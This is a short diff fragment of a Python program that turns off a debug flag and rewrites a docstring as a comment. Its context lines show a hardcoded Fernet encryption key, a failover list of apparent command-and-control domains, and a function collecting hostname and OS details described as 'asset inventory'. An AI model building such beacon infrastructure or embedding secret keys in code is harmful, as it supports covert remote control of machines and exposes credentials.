@@ -9,7 +9,7 @@ from cryptography.fernet import Fernet
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
 
-DEBUG_MODE = True
+DEBUG_MODE = False
 
 # Failover list
 C2_DOMAINS = ["https://midevil-scoring-engine.com",
@@ -30,8 +30,8 @@ else:
     CERT_PATH = r"/etc/ssl/certs/SSL.com_TLS_DSA_Root_CA_2022.crt"
 
 
+# Gathers system metadata for the dashboard asset inventory
 def get_system_info():
-    """Gathers system metadata for the dashboard asset inventory."""
     info = {
         "hostname": platform.node(),
         "os": f"{platform.system()} {platform.release()}",
